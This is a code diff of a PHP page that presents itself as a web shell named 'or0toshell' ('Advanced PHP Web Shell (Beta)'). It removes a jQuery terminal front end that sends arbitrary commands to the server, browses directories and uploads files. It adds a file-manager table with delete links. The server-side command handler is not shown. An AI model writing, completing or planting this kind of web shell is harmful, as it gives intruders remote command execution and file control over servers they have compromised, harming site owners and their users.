+                <a href="?q=<?= encodePath(CURRENT_PATH) ?>&d=<?= urlencode($file) ?>" title="Delete" onclick="return confirm('Delete this file?');">
+                  <i class="fa-solid fa-trash"></i>
+                </a>
+              </td>
+            </tr>
+          <?php endforeach; ?>
+          <?php if (empty($folders) && empty($files)): ?>
+            <tr>
+              <td colspan="5" class="text-center">No files or folders found.</td>
+            </tr>
+          <?php endif; ?>
+        </tbody>
+      </table>
     </div>
   </div>
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
-  <script>
-    var commandHistory = [];
-    var historyIndex = -1;
-    function updateFileExplorer() {
-      $.getJSON("<?php echo $_SERVER['PHP_SELF']; ?>?action=list", function(data) {
-        var explorer = $("#fileExplorer");
-        explorer.empty();
-        if (data.files && data.files.length > 0) {
-          var ul = $("<ul class='list-unstyled'></ul>");
-          data.files.forEach(function(item) {
-            var li = $("<li></li>");
-            if (item.name === '..') {
-              li.append("<span class='file-item' data-type='dir' data-name='..' title='Go to Parent Directory'><i class='bi bi-folder2-open'></i> ..</span>");
-            } else if (item.type === "dir") {
-              li.append("<span class='file-item' data-type='dir' data-name='" + item.name + "' title='Change Directory'><i class='bi bi-folder-fill'></i> " + item.name + "</span>");
-            } else {
-              li.append("<a href='" + item.download + "' target='_blank' class='file-download file-item' title='Download File'><i class='bi bi-file-earmark'></i> " + item.name + "</a>");
-            }
-            ul.append(li);
-          });
-          explorer.append(ul);
-        } else { explorer.html("<em>No files found.</em>"); }
-      });
-    }
-    function updateTerminalOutput(output) {
-      var term = $("#terminal");
-      var line = $("<div class='terminal-line fade-in'></div>").html(output.replace(/\n/g, "<br>"));
-      term.append(line);
-      term.scrollTop(term[0].scrollHeight);
-    }
-    function updateCurrentDir(dir) { $("#currentDir").text(dir); }
-    function showHistoryModal() {
-      var content = "";
-      if (commandHistory.length === 0) { content = "No command history."; }
-      else { commandHistory.forEach(function(cmd, index) { content += (index + 1) + ". " + cmd + "\n"; }); }
-      $("#historyContent").text(content);
-      var historyModal = new bootstrap.Modal(document.getElementById('historyModal'));
-      historyModal.show();
-    }
-    $(document).ready(function(){
-      updateTerminalOutput("<span class='command-output'>Welcome to Advanced PHP Web Shell (Beta). Type 'help' for available commands.</span>");
-      updateFileExplorer();
-      $("#toggleTheme").click(function(){ $("body").toggleClass("light-mode"); });
-      $("#sendCommand").click(function(){
-        var command = $("#commandInput").val();
-        if (command.trim() === "") return;
-        updateTerminalOutput("<span class='prompt'>" + $("#currentDir").text() + " msf > </span>" + command);
-        commandHistory.push(command);
-        historyIndex = commandHistory.length;
-        var originalHTML = $("#sendCommand").html();
-        $("#sendCommand").html('<span class="spinner-border spinner-border-sm"></span>');
-        $("#sendCommand").prop("disabled", true);
-        $.post("<?php echo $_SERVER['PHP_SELF']; ?>?action=command", { command: command }, function(data){
-          updateTerminalOutput(data.output);
-          updateCurrentDir(data.cwd);
-          updateFileExplorer();
-        }, "json").always(function(){
-          $("#sendCommand").html(originalHTML);
-          $("#sendCommand").prop("disabled", false);
-        });
-        $("#commandInput").val("").focus();
-      });
-      $("#commandInput").keydown(function(e){
-        if(e.keyCode === 38) {
-          if(historyIndex > 0) { historyIndex--; $("#commandInput").val(commandHistory[historyIndex]); }
-          e.preventDefault();
-        } else if(e.keyCode === 40) {
-          if(historyIndex < commandHistory.length - 1) { historyIndex++; $("#commandInput").val(commandHistory[historyIndex]); }
-          else { $("#commandInput").val(""); historyIndex = commandHistory.length; }
-          e.preventDefault();
-        }
-      });
-      $("#commandInput").keypress(function(e){ if(e.which == 13) { $("#sendCommand").click(); } });
-      $("#clearTerminal").click(function(){ $("#terminal").empty(); });
-      $("#historyBtn").click(function(){ showHistoryModal(); });
-      $("#helpBtn").click(function(){
-        var helpModal = new bootstrap.Modal(document.getElementById('helpModal'));
-        helpModal.show();
-      });
-      $("#fileExplorer").on("click", ".file-item", function(){
-        var type = $(this).data("type");
-        var name = $(this).data("name");
-        if (type === "dir") {
-          $.post("<?php echo $_SERVER['PHP_SELF']; ?>?action=command", { command: "cd " + name }, function(data){
-            updateTerminalOutput(data.output);
-            updateCurrentDir(data.cwd);
-            updateFileExplorer();
-          }, "json");
-        }
-      });
-      $("#uploadForm").submit(function(e){
-        e.preventDefault();
-        var formData = new FormData(this);
-        $.ajax({
-          url: "<?php echo $_SERVER['PHP_SELF']; ?>?action=upload",
-          type: "POST",
-          data: formData,
-          processData: false,
-          contentType: false,
-          dataType: "json",
-          success: function(data) { updateTerminalOutput(data.message); updateFileExplorer(); },
-          error: function() { updateTerminalOutput("File upload error."); }
-        });
-      });
-    });
-  </script>
+  <div class="footer">
+    or0toshell - Developed by <a href="https://www.linkedin.com/in/dragonked2" target="_blank" style="color: #FFD700;">Ali Essam</a>
+  </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
